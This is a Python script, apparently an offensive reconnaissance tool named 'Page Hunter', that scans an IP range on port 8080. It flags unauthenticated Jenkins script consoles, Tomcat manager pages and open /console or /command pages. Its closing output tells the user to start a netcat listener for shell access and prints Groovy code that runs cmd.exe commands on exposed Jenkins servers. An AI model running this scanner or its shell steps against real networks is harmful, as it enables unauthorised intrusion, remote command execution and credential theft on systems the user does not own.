import socket
import ipaddress
from ipaddress import IPv4Address, IPv4Network
import threading
from queue import Queue
import requests

print("\n")
print("\033[33m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m")
print("*                                                                             *")
print("*                                                                             *")
print("*                             __   .    __   ___                              *")
print("*                            |__| /_\  | __ |__                               *")
print("*                            |   /   \ |__| |___                              *")
print("*                                                                             *")
print("*                      |          __   |   __   __                            *")
print("*                      |__  |  | |  | _|_ |__| |  |                           *")
print("*                      |  | |__| |  |  |   \__ |                              *")
print("*                                                                             *")  
print("* Page Hunter v1.0                                                            *")
print("* Author: Cedric Owens (@cedowens)                                            *")
print("* Independent Project                                                         *")
print("\033[33m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m")


count = 0
unauthjenkins = []
commandlist = []
authjenkins = []
tomcatlist = []
consolelist = []
iplist = []
iprange = input("Enter IP range to check: ").strip()
port2 = 8080
numthreads = input("Enter the number of threads (For Mac, use a max of 250 unless you up the ulimit...on kali and most linux distros use a max of 1000 unless you up the ulimit): ").strip()
outfile = open("outfile.txt","w")
portopenlist = []
def Connector(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.6)
        result = sock.connect_ex((str(ip),port2))
        sock.close()
        if result == 0:
            print("\033[92mPort " + str(port2) + " OPEN on %s\033[0m" % str(ip))
            outfile.write("Port " + str(port2) + " OPEN on %s\n" % str(ip))
            portopenlist.append(str(ip))
        else:
            print(" " + str(ip) + ":" + str(port2))
        
    except Exception as e:
        print(e)

def threader():
    while True:
        worker = q.get()
        Connector(worker)
        q.task_done()



def jenkinschecker(host):
    url = "http://" + host + ":" + str(port2) + "/script"
    url2 = "http://" + host + ":" + str(port2) + "/manager/html"
    url3 = "http://" + host + ":" + str(port2) + "/manager/text"
    url4 = "http://" + host + ":" + str(port2) + "/console"
    url5 = "http://" + host + ":" + str(port2) + "/command"
    
    try:
        response = requests.get(url)
        response2 = requests.get(url2)
        response3 = requests.get(url3)
        response4 = requests.get(url4)
        response5 = requests.get(url5)
        
        if (response.status_code == 200 and 'Jenkins' in response.text and 'Console' in response.text):
            print("+"*40)
            print("\033[91mHost with unauthenticated Jenkins:\033[0m")
            outfile.write("Host with unauthenticated Jenkins:\n")
            outfile.write(url)
            outfile.write("\n")
            unauthjenkins.append(host)
            print(url)
        elif (response.status_code != 200 and 'from=%2Fscript' in response.text):
            print("+"*40)
            print("\033[33mHost with authenticated Jenkins:\033[0m")
            outfile.write("Host with authenticated Jenkins:\n")
            print("http://" + host + ":" + str(port2))
            outfile.write("http://" + host + ":" + str(port2))
            outfile.write("\n")
            authjenkins.append(host)
        elif (response2.status_code == 200 and 'Tomcat Manager Application' in response2.text):
            print("+"*40)
            print("\033[33mTomcat Manager HTML Page Found:\033[0m")
            outfile.write("Tomcat Manager HTML Page Found:\n")
            print("http://" + host + ":" + str(port2) + '/manager/html')
            outfile.write(url2)
            outfile.write("\n")
            tomcatlist.append(host)
            print(url2)
        elif (response3.status_code == 200 and 'Manager' in response3.text):
            print("+"*40)
            print("\033[33mTomcat manager/text Page Found:\033[0m")
            print("http://" + host + ":" + str(port2) + '/manager/text')
            outfile.write("Tomcat manager/text Page Found:\n")
            outfile.write(url3)
            outfile.write("\n")
            tomcatlist.append(host)
            print(url3)
        elif (response4.status_code == 200 and 'Console' in response4.text):
            print("+"*40)
            print("\033[33mPossibly open console page found:\033[0m")
            print("http://" + host + ":" + str(port2) + '/console')
            outfile.write("Possibly open console page found. Go check it out!:\n")
            outfile.write(url4)
            outfile.write("\n")
            consolelist.append(host)
        elif (response5.status_code == 200 and 'Command' in response5.text):
            print("+"*40)
            print("\033[33mPossibly open command page found:\033[0m")
            outfile.write("Possibly open command page found. Go check it out!:\n")
            outfile.write(url5)
            outfile.write("\n")
            commandlist.append(host)
        else:
            pass
    except requests.exceptions.RequestException:
        pass


def threader2():
    while True:
        worker2 = q2.get()
        jenkinschecker(worker2)
        q2.task_done()

q = Queue()


for ip in ipaddress.IPv4Network(iprange):
    count = count + 1
    iplist.append(str(ip))
    
for x in range(int(numthreads)):
    t = threading.Thread(target=threader)
    t.daemon = True
    t.start()



for worker in iplist:
    q.put(worker)



q.join()


q2 = Queue()

for y in range(200):
    t2 = threading.Thread(target=threader2)
    t2.daemon = True
    t2.start()

for worker2 in portopenlist:
    item = str(ipaddress.IPv4Address(worker2))
    q2.put(item)

q2.join()

if unauthjenkins != []:
    print("+"*40)
    print("If Jenkins is running on Linux, start a local netcat listener (ex: nc -nlvp <port>) and follow the steps here to get command shell access:")
    print("https://www.n00py.io/2017/01/compromising-jenkins-and-extracting-credentials/")
    print('')
    print("If Jenkins is running on Windows, run Windows commands by typing the following into the script console:")
    print("def sout = new StringBuffer(), serr = new StringBuffer()")
    print("def proc = 'cmd.exe /c <command>'.execute()")
    print("proc.waitForKill(1000)")
    print('println "out> $sout err> $serr"')

if unauthjenkins == []:
    print("+"*40)
    print("No instances of unauthenticated Jenkins found.")
    outfile.write("No instances of unauthenticated Jenkins found.\n")

if authjenkins == []:
    print("+"*40)
    print("No instances of authenticated Jenkins found.")
    outfile.write("No instances of authenticated Jenkins found.\n")

if tomcatlist == []:
    print("+"*40)
    print("No Apache Tomcat manager pages found.")
    outfile.write("No Apache Tomcat manager pages found.\n")

if consolelist == []:
    print("+"*40)
    print("No interesting sites with /console pages found.")
    outfile.write("No interesting sites with /console pages found.\n")

if commandlist == []:
    print("+"*40)
    print("No interesting sites with /command pages found.")
    outfile.write("No interesting sites with /command pages found.\n")

outfile.close()        
print("+"*40)
print("DONE!")
print("Data written to outfile.txt in the current directory.")
print("+"*40)
